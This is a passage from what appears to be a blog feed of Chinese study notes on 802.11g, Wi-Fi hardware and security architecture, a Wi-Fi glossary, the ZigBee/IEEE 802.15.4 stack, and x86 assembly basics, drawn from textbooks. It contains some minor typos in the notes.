<h1 id="802-11g：增强速率物理层"><a href="#802-11g：增强速率物理层" class="headerlink" title="802.11g：增强速率物理层"></a>802.11g：增强速率物理层</h1><h2 id="802-11g的组件"><a href="#802-11g的组件" class="headerlink" title="802.11g的组件"></a>802.11g的组件</h2><p>802.11g是将好几种物理层规范合而为一。统称为<strong>增强速率物理层（ERP）</strong></p>
<h2 id="ERP的物理层汇聚过程（PLCP）"><a href="#ERP的物理层汇聚过程（PLCP）" class="headerlink" title="ERP的物理层汇聚过程（PLCP）"></a>ERP的物理层汇聚过程（PLCP）</h2><h3 id="ERP-OFDM的成帧"><a href="#ERP-OFDM的成帧" class="headerlink" title="ERP-OFDM的成帧"></a>ERP-OFDM的成帧</h3><p>ERP-OFDM物理层所使用的帧格式几乎和802.11a完全相同。</p>
<h1 id="802-11硬件"><a href="#802-11硬件" class="headerlink" title="802.11硬件"></a>802.11硬件</h1><h2 id="802-11接口的一般结构"><a href="#802-11接口的一般结构" class="headerlink" title="802.11接口的一般结构"></a>802.11接口的一般结构</h2><p>无线局域网络接口内含有天线。大多数802.11接口使用两组天线作为天线分集。</p>
<p>接收到无线电信号时，无线电系统会自动选择信号最强的天线来进行收发。</p>
<p>几乎市面上的所有产品都不会再传输帧时使用天线分集，仅使用“主要”天线进行传输。</p>
<ul>
<li>天线将无线电信号传给收发器。收发器使用放大器来强化对外传送的信号。</li>
<li>收发器之后是基带处理器，它是无线局域网络系统中数字与模拟组件之间的接口。</li>
<li>媒介访问控制器（MAC）是整个接口的核心，负责从主机操作系统的网络堆栈中取出所接受到的帧以及决定何时通过天线将帧传送出去。MAC会通过系统总线接口从操作系统取得帧。</li>
</ul>
<h2 id="解读规格表"><a href="#解读规格表" class="headerlink" title="解读规格表"></a>解读规格表</h2><p>传输距离何以说是接收灵敏度的函数。所谓接收灵敏度，是指接收器能够正确将信号转换为数据的最微弱信号。灵敏度越高，传输距离就越长。</p>
<h3 id="灵敏度比较"><a href="#灵敏度比较" class="headerlink" title="灵敏度比较"></a>灵敏度比较</h3><p>灵敏度是由802.11物理层所决定的。</p>
<p><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来，学习途径是《WiFi802.11无线网络权威指南（第二版）》；</em></p>
]]></content>
      <categories>
        <category>网络通信协议</category>
      </categories>
      <tags>
        <tag>Wi-Fi协议</tag>
      </tags>
  </entry>
  <entry>
    <title>Wi-Fi协议笔记(0X10)</title>
    <url>/Wi-Fi%E5%8D%8F%E8%AE%AE10/</url>
    <content><![CDATA[<h1 id="使用802-11接入点"><a href="#使用802-11接入点" class="headerlink" title="使用802.11接入点"></a>使用802.11接入点</h1><h2 id="接入点的基本功能"><a href="#接入点的基本功能" class="headerlink" title="接入点的基本功能"></a>接入点的基本功能</h2><p>接入点是扮演无线与有限网络之间的桥梁。接入点具备网络桥接器的所有功能。</p>
<p>接入点至少具备两个网络接口：</p>
<ul>
<li>无线接口通晓802.11相关细节。</li>
<li>另一个接口连接至有线网络。</li>
</ul>
<p>所有无线接口都必须支持802.11信道访问的基本规则。接入点可以提供DHCP、NAT等服务。</p>
<h2 id="接入点的种类"><a href="#接入点的种类" class="headerlink" title="接入点的种类"></a>接入点的种类</h2><ul>
<li><p>家用：家庭网关</p>
<blockquote>
<p>大部分内设DHCP服务器，便于即插即用的配置设定。</p>
<p>用户通常会被部署一个可路由的IP地址，因此NAT的做法十分常见。</p>
<p>配备的WAN接口可能是调制解调器、串行端口甚至是DSL。</p>
<p>通常自成一个独立的单元并且内设天线。</p>
</blockquote>
</li>
<li><p>一般商用：企业接入点</p>
<blockquote>
<p>需要在较大的范围内提供移动性且必须有几个接入点彼此配合。</p>
<p>企业级产品着重于可升级性，尽可能延长使用年限。</p>
<p>通常企业级产品会附带实地勘察工具，网络管理人员可以根据覆盖范围的信号质量来规划大型的部署计划。</p>
</blockquote>
</li>
<li><p>大型商用：无线交换器</p>
<blockquote>
<p>此架构中，功能较简单的几个轻量级接入点由一个中央交换器加以控制。</p>
</blockquote>
</li>
</ul>
<h1 id="安全性架构"><a href="#安全性架构" class="headerlink" title="安全性架构"></a>安全性架构</h1><h2 id="安全性的定义与分析"><a href="#安全性的定义与分析" class="headerlink" title="安全性的定义与分析"></a>安全性的定义与分析</h2><p>数据安全性可用三种属性加以定义，三者兼备才能确保安全性。    </p>
<ul>
<li><p>完整性</p>
<blockquote>
<p>如果数据被未授权的用户篡改，完整性就已被破坏。</p>
</blockquote>
</li>
<li><p>私密性</p>
</li>
<li><p>可用性</p>
</li>
</ul>
<h2 id="身份验证与访问控制"><a href="#身份验证与访问控制" class="headerlink" title="身份验证与访问控制"></a>身份验证与访问控制</h2><ul>
<li><p>工作站身份验证</p>
<blockquote>
<p>工作站必须设定接入点所使用的网络名称（SSID）。</p>
</blockquote>
</li>
<li><p>工作站与接入点关联（MAC地址过滤）</p>
<blockquote>
<p>接入点维护一份经过授权的MAC地址列表，不在列表上的工作站的关联请求就会被拒绝。</p>
</blockquote>
</li>
<li><p>链路层（802.1X协议）</p>
<blockquote>
<p>802.1X与WPA。链路层身份验证机制在进行身份验证时之允许有限的网络访问，在确定用户身份后才会均需完整的网络访问。</p>
</blockquote>
</li>
<li><p>网络层或传输层（防火墙）</p>
</li>
<li><p>MAC地址过滤（MAC白名单）</p>
</li>
<li><p>WPA预共享秘钥（允许工作站在只拥有“密码短与”的情况下进行身份验证。）</p>
</li>
<li><p>网络层（VPN）</p>
</li>
</ul>
<p><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来，学习途径是《WiFi802.11无线网络权威指南（第二版）》；</em></p>
]]></content>
      <categories>
        <category>网络通信协议</category>
      </categories>
      <tags>
        <tag>Wi-Fi协议</tag>
      </tags>
  </entry>
  <entry>
    <title>Wi-Fi协议名词解释</title>
    <url>/Wi-Fi%E5%8D%8F%E8%AE%AE11/</url>
    <content><![CDATA[<h1 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h1><p>AAA：身份验证，授权与计费</p>
<p>ACK：确认机制</p>
<p>AES：高级加密标准</p>
<p>AID：关联标识符</p>
<p>AKM：身份验证与秘钥管理</p>
<p>AP：接入点</p>
<p>AS：身份验证服务器</p>
<p>ASN：抽象语法标记</p>
<p>ATIM：通知传输指示消息</p>
<p>BBS：基本服务集</p>
<p>SSID：服务集标识符</p>
<p>BSSID：基本服务集标识</p>
<p>CCK：补码键控</p>
<p>CCMP：特别坚固的加密协议</p>
<p>CF：无竞争</p>
<p>CFP：无竞争周期</p>
<p>CRC：循环冗余校验</p>
<p>CSMA/MA：载波监听多路访问/冲突避免（）通过延迟访问来避免多方同事访问传输媒介</p>
<p>CTS：清除发送（通知对方已收到请求发送信息：RTS，可以开始传送数据的确认）</p>
<p>DA：目的地地址</p>
<p>DCF：分布式协调功能</p>
<p>DFS：动态频率选择</p>
<p>DHCP：动态主机配置协议</p>
<p>DIFS：分布式帧间间隔</p>
<p>DS：分布式系统</p>
<p>DSSS：直接序列扩频</p>
<p>DTIM：延迟传输指示映射</p>
<p>EAP：可扩展身份验证协议</p>
<p>EIFS：扩展帧间间隔</p>
<p>EIRP：有效等向辐射功率</p>
<p>ERP：有效辐射功率</p>
<p>ESS：扩展服务集</p>
<p>FCS：帧校验序列</p>
<p>FH：跳频</p>
<p>FHSS：跳频扩频</p>
<p>GMK：组主秘钥</p>
<p>GTK：组临时秘钥</p>
<p>HR/DSSS：告诉直接序列扩频</p>
<p>IAPP：接入点内部协议</p>
<p>IBSS：独立基本服务集</p>
<p>ICV：完整性校验值</p>
<p>IEEE：电气和电子工程师协会</p>
<p>IR：红外线</p>
<p>ISI：符号间干扰</p>
<p>IV：初始向量</p>
<p>LLC：逻辑链路控制</p>
<p>KCK：秘钥确认秘钥</p>
<p>KEK：秘钥加密秘钥</p>
<p>MAC：媒介访问控制</p>
<p>MIB：管理信息库</p>
<p>MIC：消息完整性校验码</p>
<p>MIMO：多进/多出</p>
<p>MPDU：MAC协议数据单元</p>
<p>MSDU：MAC服务数据单元</p>
<p>NAV：网络分配向量</p>
<p>OFDM：正交频分复用</p>
<p>OSI：开放式系统互联参考迷行</p>
<p>PBCC：分组二进制卷积码</p>
<p>PC：点协调者</p>
<p>PCF：点协调功能</p>
<p>PDU：协议数据单元</p>
<p>PER：封包错误率</p>
<p>PHY：物理层</p>
<p>PIFS：PCF帧间间隔</p>
<p>PLCP：物理层汇聚过程</p>
<p>PMD：物理媒介相关</p>
<p>PMK：成对主秘钥</p>
<p>PPDU：PLCP协议数据单元</p>
<p>PRF：伪随机函数</p>
<p>PS：省电操作</p>
<p>PSDU：PLCP服务数据单元</p>
<p>PTK：成对临时秘钥</p>
<p>RA：接收端地址</p>
<p>RADIUS：远程认证拨号用户服务</p>
<p>RC4：RC4加密算法</p>
<p>RLAN：无线电局域网</p>
<p>RF：射频</p>
<p>RSN：强健安全网络</p>
<p>RTS：请求传送</p>
<p>SA：来源地址</p>
<p>SFD：其实帧定界符</p>
<p>SIFS：短帧间间隔</p>
<p>TA：传送端地址</p>
<p>TIM：传输只是映射</p>
<p>TK：临时秘钥</p>
<p>TKIP：临时秘钥完整性协议</p>
<p>TCP：传输功率控制</p>
<p>WEP：有限等效加密</p>
<p>Wi-Fi：无线保真</p>
<p>WPA and WPA2：WIFI保护访问</p>
<p><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来，学习途径是《WiFi802.11无线网络权威指南（第二版）》；</em></p>
]]></content>
      <categories>
        <category>网络通信协议</category>
      </categories>
      <tags>
        <tag>Wi-Fi协议</tag>
      </tags>
  </entry>
  <entry>
    <title>ZigBee协议笔记(0X01)</title>
    <url>/ZigBee%E5%8D%8F%E8%AE%AE01/</url>
    <content><![CDATA[<h1 id="短距离无线数据网络基础"><a href="#短距离无线数据网络基础" class="headerlink" title="短距离无线数据网络基础"></a>短距离无线数据网络基础</h1><h2 id="典型的短距离无线数据网络技术"><a href="#典型的短距离无线数据网络技术" class="headerlink" title="典型的短距离无线数据网络技术"></a>典型的短距离无线数据网络技术</h2><h3 id="ZigBee"><a href="#ZigBee" class="headerlink" title="ZigBee"></a>ZigBee</h3><p>ZigBee是一种短距离、低速率无线网络技术，它是一种借与无线标记技术和蓝牙之间的技术方案，主要用于近距离无线连接。</p>
<p>它有自己的无线电标准，在微小的传感器之间互相协调实现通信。这些传感器只需要很少的能量，以接力的方式通过无线电波将数据从一个传感器传到另一个传感器，所以通信效率非常高。</p>
<p>ZigBee的基础是IEEE 802.15.4，这是IEEE无线个人局域网工作组的一项标准，被称作ZigBee技术标准。</p>
<p>每个ZigBee网络节点（FFD和RFD）可以支持多达31个传感器和受控设备，每一个传感器和受控设备可以有八种不同的接口方式，可以采集和传输数字量和模拟量</p>
<blockquote>
<p>ZigBee技术的特点包括以下几个方面：</p>
<ul>
<li>省电。两节五号电池支持长达6个月到2年左右的使用时间。</li>
<li>可靠。采用了碰撞避免机制，同时为需要固定带宽的通信业务预留了专用时隙，避免的数据发送时的竞争和冲突；节点模块之间既有自动动态组网的功能，信息在整个ZigBee网络中通过自动路由的方式进行传输，从而保证了信息传输的可靠性。</li>
<li>时延短。针对时延敏感的应用做了优化，通信时延和从休眠状态激活的时延都非常短</li>
<li>网络容量大。可支持达65000个节点。</li>
<li>安全。ZigBee提供了数据完整性检查和鉴权功能，加密算法采用通用的AES-128。</li>
<li>高保密性。采用64位出厂编号并支持AES-128加密</li>
</ul>
</blockquote>
<h2 id="IEEE-802-15-4短距离无线通信标准"><a href="#IEEE-802-15-4短距离无线通信标准" class="headerlink" title="IEEE 802.15.4短距离无线通信标准"></a>IEEE 802.15.4短距离无线通信标准</h2><h3 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h3><p>IEEE 802.15.4提供两个物理层：</p>
<ul>
<li>2.4GHz物理层</li>
<li>868/915MHz物理层</li>
</ul>
<p>相同点：以上两个物理层均采用支扩序列调制（DSSS）方式，他们共享一个基本包帧结构，具有较小的执行周期和功率消耗。</p>
<p>不同点：基本区别是通频带不一样；传输速率不同</p>
<p>两个物理层共有3个频带，被分为27个频率信道。</p>
<blockquote>
<p>868/915MHz物理层在868.0<del>868.6MHz之间，支持一个信道，称为0号信道。在902 ~ 928MHz之间，则支持10个信道，称为1</del>11信道。</p>
<p>2.4GHz物理层在2.4~2.4834GHz之间支持16个信道，为12 ~ 27信道，每个信道的频带宽达5MHz。</p>
</blockquote>
<h3 id="MAC层（介质介入控制子层）层"><a href="#MAC层（介质介入控制子层）层" class="headerlink" title="MAC层（介质介入控制子层）层"></a>MAC层（介质介入控制子层）层</h3><p>IEEE 802.15.4 MAC的特点是具有关联性和非关联性、确认帧传递、信道介入机制、帧证实、保证时隙管理、新标管理。</p>
<p>MAC帧结构的设计非常灵活，能维持简单的协议运行，满足不同应用和网络拓扑结构的需要。</p>
<h3 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h3><p>IEEE 802.15.4支持多种网络拓扑结构，包括新型网状结构。</p>
<h2 id="ZigBee技术"><a href="#ZigBee技术" class="headerlink" title="ZigBee技术"></a>ZigBee技术</h2><h3 id="低功耗低速技术特点"><a href="#低功耗低速技术特点" class="headerlink" title="低功耗低速技术特点"></a>低功耗低速技术特点</h3><p>ZigBee技术是一种应用于短距离范围内、低传输速率下的各种电子设备之间的无线通信技术。</p>
<p>采用ZigBee技术的产品可以在2.4GHz上提供250kb/s（16个信道）</p>
<ul>
<li><p>低功耗</p>
<blockquote>
<p>工作模式情况下，ZigBee的传输速率低，传输数据量很小，因而信号的收发时间很短；</p>
<p>在非工作模式时，ZigBee节点处于休眠模式。</p>
</blockquote>
</li>
<li><p>可靠性高</p>
<blockquote>
<p>ZigBee的媒体介入控制层（MAC层）采用了talk-when-ready的碰撞避免机制。</p>
</blockquote>
</li>
<li><p>高度扩充性</p>
<blockquote>
<p>一个ZigBee的网路最多包括有255个ZigBee网络节点，其中一个是Master设备，其余则是Slave设备。</p>
</blockquote>
</li>
</ul>
<h3 id="安全和加密"><a href="#安全和加密" class="headerlink" title="安全和加密"></a>安全和加密</h3><ol>
<li><p>安全</p>
<blockquote>
<p>在ZigBee技术中心，采用对称秘钥的安全机制。秘钥由网络层和应用层根据实际应用需要生成，并对其进行管理、存储、传送和更新等。</p>
<p>安全机制由安全服务提供层提供。</p>
</blockquote>
</li>
<li><p>加密</p>
<blockquote>
<p>位顺序、串接、证书编码和计时器增加、技术模式（CTR）加密、密码链块-信息鉴权码（CBC-MAC）验证、技术模式和密码链块-信息鉴权码（CCM）验证、技术模式和密码链块-信息鉴权码（CCM）的加密和验证、高级加密标准（AES）加密、个域网信息库（PIB）的安全要素。</p>
</blockquote>
</li>
</ol>
<p><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来，学习途径是《ZigBee无线网络技术入门与实战》；</em></p>
]]></content>
      <categories>
        <category>网络通信协议</category>
      </categories>
      <tags>
        <tag>ZigBee协议</tag>
      </tags>
  </entry>
  <entry>
    <title>ZigBee协议笔记(0X02)</title>
    <url>/ZigBee%E5%8D%8F%E8%AE%AE02/</url>
    <content><![CDATA[<h1 id="ZigBee协议栈结构和原理"><a href="#ZigBee协议栈结构和原理" class="headerlink" title="ZigBee协议栈结构和原理"></a>ZigBee协议栈结构和原理</h1><h2 id="ZigBee协议栈概述"><a href="#ZigBee协议栈概述" class="headerlink" title="ZigBee协议栈概述"></a>ZigBee协议栈概述</h2><p>ZigBee协议栈由一组子层构成，每层为其上层提供一组特定的服务：</p>
<blockquote>
<p>一个数据实体提供数据传输服务。</p>
<p>一个管理实体提供全部其他服务。</p>
</blockquote>
<h2 id="IEEE-802-15-4通信层"><a href="#IEEE-802-15-4通信层" class="headerlink" title="IEEE 802.15.4通信层"></a>IEEE 802.15.4通信层</h2><p>IEEE 802.15.4标准定义了最下面的两层–物理层（PHY）和介质介入控制子层（MAC），而ZigBee直接使用了IEEE802.15.4所定义的物理层和介质介入控制子层来作为ZigBee的物理层和介质介入控制子层。</p>
<h3 id="PHY（物理）层"><a href="#PHY（物理）层" class="headerlink" title="PHY（物理）层"></a>PHY（物理）层</h3><p>物理层通过射频固件和射频硬件提供了一个从MAC层到物理层无线信号的接口。</p>
<p>ZigBee物理层数据包由同步包头、物理层包头和物理层净荷3部分组成。</p>
<blockquote>
<p>同步包头由钱同步码（前导码）和数据包（帧）定界符组成，用于获取符号同步、扩频码同步和帧同步，也有助于粗略的频率调整；</p>
<p>物理层包头只是净荷部分的长度；</p>
<p>物理层净荷部分好友MAC层数据包，净荷部分最大昌都市127字节。</p>
</blockquote>
<h3 id="MAC（介质介入控制子层）层"><a href="#MAC（介质介入控制子层）层" class="headerlink" title="MAC（介质介入控制子层）层"></a>MAC（介质介入控制子层）层</h3><p>MAC层在服务协议汇聚层（SSCS）和物理层之间提供了一个接口。</p>
<blockquote>
<p>MAC层包括一个管理实体，该实体通过一个服务接口可调用MAC层管理功能，该实体还负责维护MAC层固有的管理对象的数据库。</p>
<p>MAC层通过他的公共部分子层服务接入点为他提供数据服务；</p>
<p>MAC层通过它的管理试题服务接入点为他提供管理服务。</p>
</blockquote>
<h2 id="ZigBee网络层"><a href="#ZigBee网络层" class="headerlink" title="ZigBee网络层"></a>ZigBee网络层</h2><p>ZigBee设备应包括802.15.4的PHY、MAC、ZigBee堆栈层：网络层（NWK）应用层和安全服务管理。</p>
<p>每个接口都能接收（用于输入）或发送（用于输出）簇格式的数据。一共两个特殊的端点，即端点0和端点255。</p>
<blockquote>
<p>端点0用于整个ZigBee设备的配置和管理，应用程序通过端点0与ZigBee堆栈的其他层通信，从而实现对这些层的初始化和配置。</p>
<p>端点255用于向多有端点的广播。</p>
<p>端点241~254是保留端点。</p>
<p>所有端点都是用应用支持子层（APS）提供的服务。APS通过网络层和安全服务提供层与端点连接，并为数据传送、安全和保定提供服务。</p>
<p>APS使用网络层（NWK）提供的服务。NWK负责设备到设备的通信，并负责网络中设备出书画所包含的活动、消息路由和网络发现。</p>
</blockquote>
<h3 id="网络层概况"><a href="#网络层概况" class="headerlink" title="网络层概况"></a>网络层概况</h3><p>ZigBee网络层的主要功能就是提供一些必要的函数，确保ZigBee的MAC层正常工作，并为应用层提供合适的服务接口。</p>
<h2 id="ZigBee应用层"><a href="#ZigBee应用层" class="headerlink" title="ZigBee应用层"></a>ZigBee应用层</h2><p>ZigBee应用层框架包括</p>
<ul>
<li><p>应用支持层（APS）</p>
<blockquote>
<p>包括维持绑定表、在绑定设备之间传送消息。</p>
</blockquote>
</li>
<li><p>ZigBee设备对象（ZDO）</p>
<blockquote>
<p>包括定义设备在网络中的角色（如ZigBee协调器和终端设备），发起响应和绑定请求，脏网络设备之间建立安全机制、发现网络中的设备并决定向他们提供何种服务。</p>
</blockquote>
</li>
</ul>
<p><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来，学习途径是《ZigBee无线网络技术入门与实战》；</em></p>
]]></content>
      <categories>
        <category>网络通信协议</category>
      </categories>
      <tags>
        <tag>ZigBee协议</tag>
      </tags>
  </entry>
  <entry>
    <title>x86汇编学习笔记(0X01)</title>
    <url>/x86%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_0x01/</url>
    <content><![CDATA[<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="二进制-lt-–-gt-十进制"><a href="#二进制-lt-–-gt-十进制" class="headerlink" title="二进制&lt;–&gt;十进制"></a>二进制&lt;–&gt;十进制</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">01000100（二进制） -----------68（十进制）</span><br><span class="line">&#x2F;&#x2F;从1开始，1，2，4，8，17，34，68</span><br></pre></td></tr></table></figure>
<h2 id="汇编语言的组成"><a href="#汇编语言的组成" class="headerlink" title="汇编语言的组成"></a>汇编语言的组成</h2><ol>
<li>汇编指令：机器码的助记符，有对应的机器码。</li>
<li>伪指令：没有对应的机器码，由编译器执行，计算机并不执行。</li>
<li>其他符号：如<code>+、-、*、/</code> 等，由编译器识别，没有对应的机器码。</li>
</ol>
<h2 id="存储器"><a href="#存储器" class="headerlink" title="存储器"></a>存储器</h2><blockquote>
<p>指令和数据在存储器中存放，也就是平常说的内存。离开了内存，再好的cpu也无法工作</p>
</blockquote>
<h2 id="指令和数据"><a href="#指令和数据" class="headerlink" title="指令和数据"></a>指令和数据</h2><blockquote>
<p>指令和数据是应用上的概念，CPU在工作的时候，把有的信息看作指令，有的信息看作数据，为同样的信息赋予了不同意义</p>
<p>例：</p>
<ul>
<li>1000100111011000  –&gt;  86D8H （数据）</li>
<li>1000100111011000 –&gt;  mov ax,bx（程序）</li>
</ul>
</blockquote>
<h2 id="汇编命令"><a href="#汇编命令" class="headerlink" title="汇编命令"></a>汇编命令</h2><ul>
<li>操作：寄存器BX的内容送到AX中</li>
<li>机器指令：1000100111011000</li>
<li>汇编指令：mov ax,bx</li>
</ul>
<h2 id="存储单元"><a href="#存储单元" class="headerlink" title="存储单元"></a>存储单元</h2><blockquote>
<p>存储器被划分为若干存储单元，例如一个存储器由128个存储单元，一个存储单元可以存储8个bit，也就是一个Byte（字节），即8个二进制位，那么128个存储单元也就可以存储128个字节。</p>
</blockquote>
<h2 id="CPU对存储器的读写"><a href="#CPU对存储器的读写" class="headerlink" title="CPU对存储器的读写"></a>CPU对存储器的读写</h2><blockquote>
<p>CPU想要进行数据的读写，必须和外部器件（准确的说是芯片）进行下面3类信息交互</p>
<ul>
<li>存储单元的地址（地址信息）</li>
<li>器件的选择，读或写的命令（控制信息）</li>
<li>读或写的数据（数据信息）</li>
</ul>
<p>CPU通过总线将地址、数据、控制信息传到存储芯片中</p>
<p>总线又分为3类：地址总线、数据总线、控制总线</p>
</blockquote>
<h3 id="读写操作步骤："><a href="#读写操作步骤：" class="headerlink" title="读写操作步骤："></a>读写操作步骤：</h3><p><img src= "/img/loading.gif" data-lazy-src="https://github.com/whh6tl/img/blob/master/1.1.3.png?raw=true" alt="1.1.3.png"></p>
<ol>
<li>cpu通过地址线将要操作的地址信息发出</li>
<li>CPU通过控制线发出内存读/写命令，选中存储芯片，并通知它，将要读/写数据。</li>
<li>存储器将cpu需要的单元中的数据通过导线送入cpu，反之亦然。</li>
</ol>
<blockquote>
<p>例：</p>
<ul>
<li>机器码：10100001 00000011 00000000</li>
<li>对应的汇编指令：MOV AX,[3]</li>
<li>含义： 传送3号单元的内容入AX</li>
</ul>
</blockquote>
<h2 id="地址总线"><a href="#地址总线" class="headerlink" title="地址总线"></a>地址总线</h2><blockquote>
<p>一个CPU有N根地址线，则可以说这个CPU的地址总线的宽度位N。这样的CPU最多可以寻找2的N次方个内存单元。</p>
</blockquote>
<h2 id="数据总线"><a href="#数据总线" class="headerlink" title="数据总线"></a>数据总线</h2><blockquote>
<p>数据总线的宽度决定了CPU和外节的数据传送速度。8根数据总线一次可传送一个8位二进制数据（即一个字节）。16根数据总线一次就是可以传送两个字节</p>
<ul>
<li>8088CPU总线宽度为8，向内存中写入数据89D8时，由于一次只能传送一个8位2进制数，所以第一次传送D8，第二次传送89</li>
<li>8086CPU总线宽度位16，向内存中写入数据89D8时，由于一次可以传送1个16位2进制数，所以一次性传输89D8</li>
</ul>
<p><img src= "/img/loading.gif" data-lazy-src="https://github.com/whh6tl/img/blob/master/1.1.5.png?raw=true" alt="1.1.5.png"></p>
<p><img src= "/img/loading.gif" data-lazy-src="https://github.com/whh6tl/img/blob/master/1.1.6.png?raw=true" alt="1.1.6.png"></p>
</blockquote>
<h2 id="控制总线"><a href="#控制总线" class="headerlink" title="控制总线"></a>控制总线</h2><blockquote>
<p>控制总线是一些不同控制线的集合。有多少控制总线，就意味着CPU提供了对外部器件的多少种控制，所以控制总线的宽度决定了CPU对外部器件的控制能力。</p>
</blockquote>
<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><ol>
<li><p>汇编指令是机器指令的助记符，统计器指令一一对应。</p>
</li>
<li><p>每一种CPU都有自己的汇编指令集。</p>
</li>
<li><p>CPU可以直接使用的信息在存储器中存放。</p>
</li>
<li><p>在存储器中指令和数据没有任何区别，都是二进制信息。</p>
</li>
<li><p>存储单元从令开始顺序编号</p>
</li>
<li><p>一个存储单元可以存储8个bit，即8位二进制数。</p>
</li>
<li><p>1Byte=8bit      1KB=1024B    1MB=1024KB    1GB=1024MB</p>
</li>
<li><p>每一个CPU芯片都有许多管脚，这些管脚和总线相连。也可以说，这些管脚引出总线。一个CPU可以引出三种总线的宽度标志了这个CPU的不同方面的性能。</p>
<blockquote>
<p>地址总线的宽度决定了CPU的寻址能力；</p>
<p>数据总线的宽度决定了CPU与其他器件进行数据传送时的一次数据传送量；</p>
<p>控制总线的宽度掘洞了CPU对系统中其他器件的控制能力。</p>
</blockquote>
</li>
</ol>
<p><strong><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来；学习的途径是《汇编语言（第3版）》王爽著；</em></strong></p>
]]></content>
      <categories>
        <category>x86汇编</category>
      </categories>
      <tags>
        <tag>x86汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>x86汇编学习笔记(0X02)</title>
    <url>/x86%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_0x02/</url>
    <content><![CDATA[<h1 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h1><h2 id="内存地址空间（概述）"><a href="#内存地址空间（概述）" class="headerlink" title="内存地址空间（概述）"></a>内存地址空间（概述）</h2><blockquote>
<p>例：</p>
<p>一个CPU的地址总线宽度位10，那么他的寻址空间就是1024个内存单元，这1024个可以寻到的内存单元就构成了整个CPU的内存地址空间。</p>
</blockquote>
<h2 id="主板"><a href="#主板" class="headerlink" title="主板"></a>主板</h2><blockquote>
<p>每一台PC机中，都有一个主板，主板上有核心器件和一些主要器件、这些器件通过总线（地址总线、数据总线、控制总线）相连。这些器件有CPU、存储器、外围芯片组、扩展插槽等等，扩展插槽上一般有RAM内存条和各类接卡口。</p>
</blockquote>
<h2 id="接口卡"><a href="#接口卡" class="headerlink" title="接口卡"></a>接口卡</h2><blockquote>
<p>计算机中，所有设备必须受CPU控制。CPU通过总线向接卡口发送命令，接卡口根据CPU的命令控制外接设备工作。</p>
</blockquote>
<h2 id="各类存储器芯片"><a href="#各类存储器芯片" class="headerlink" title="各类存储器芯片"></a>各类存储器芯片</h2><blockquote>
<p>从读写属性上分为两类：</p>
<ul>
<li>随机存储器（RAM）—-可读可写，但必须带点存储，关机后存储的内容丢失。</li>
<li>只读存储器（ROM）—-只读，关机后内容不丢失。</li>
</ul>
<p>从功能和链接分为以下几类</p>
<ul>
<li><p>随机存储器</p>
<p>  <em>用于存放CPU使用的绝大部分数据，<strong>主随机存储器</strong>一般由主板和扩展插槽上的RAM存储器构成</em></p>
</li>
<li><p>装有BIOS的ROM</p>
<p>  <em>BIOS是又主板和各类接卡口厂商提供的软件系统，可以利用该硬件设备进行最基本的输入输出。在主板和某些接卡口上插有存储响应BIOS的ROM，例如：显卡的ROM存储着显卡的BIOS，网卡的ROM存储网卡的BIOS</em></p>
</li>
<li><p>接卡口上的RAM</p>
<p>  <em>某些接卡口需要对大量输入、输出数据进行暂存，其上就装有RAM</em></p>
</li>
</ul>
<p>下图展示了PC中各类存储器的逻辑连接情况</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://github.com/whh6tl/img/blob/master/1.1.7.png?raw=true" alt="1.1.7.png"></p>
</blockquote>
<h2 id="内存地址空间"><a href="#内存地址空间" class="headerlink" title="内存地址空间"></a>内存地址空间</h2><blockquote>
<p>上述的存储器，在物理上是独立的器件，但是以下两点相同</p>
<ul>
<li>都和CPU相连</li>
<li>CPU对他们读写的时候通过<strong>控制线</strong>发送读写命令</li>
</ul>
<p><img src= "/img/loading.gif" data-lazy-src="https://github.com/whh6tl/img/blob/master/1.1.8.png?raw=true" alt="1.1.8.png"></p>
<p>CPU在操纵他们的时候，把它们当作内存来对待。把他们当作由一个或若干个由存储单元组成的逻辑存储器，这个<strong>逻辑存储器</strong>就是内存地址空间</p>
<p>内存地址空间大小受CPU总线宽度影响，比如8086CPU的总线宽度位20，那么就可以传送2的20次方个不同的地址信息。即可以定位2的20次方个内存单元，即8086PC的内存地址空间为1M.</p>
<p><strong>最终运行的程序时CPU，用汇编语言编程的时候，必须要从CPU的角度考虑问题。</strong></p>
<p><strong>对CPU来讲，系统中所有存储器中的存储单元都属于一个逻辑存储器中，它的容量受CPU的寻址能力限制。这个逻辑存储器就是我们所说的你存地址空间</strong></p>
</blockquote>
<p><strong><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来；学习的途径是《汇编语言（第3版）》王爽著；</em></strong></p>
]]></content>
      <categories>
        <category>x86汇编</category>
      </categories>
      <tags>
        <tag>x86汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>x86汇编学习笔记(0X03)</title>
    <url>/x86%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_0x03/</url>
    <content><![CDATA[<h1 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h1><blockquote>
<p>一个典型的CPU由运算器、控制器、寄存器组成。这些器件靠<strong>内部总线</strong>相连。之前说的总线相对于CPU来说是外部总线，内部总线实现CPU内部各个器件之间的联系，外部总线实现和主板上其他器件的联系。</p>
<p>在CPU中：</p>
<ul>
<li><p>运算器进行信息处理</p>
</li>
<li><p>寄存器进行信息存储</p>
</li>
<li><p>控制器控制各个器件进行工作</p>
</li>
<li><p><strong>内部总线</strong>连接各种器件，在他们之间进行数据的传送</p>
<p>  对汇编来说，CPU最主要的部件是寄存器，寄存器是CPU中可以用指令读写的部件。可以通过改变寄存器中的内容来实现对CPU的控制。</p>
</li>
</ul>
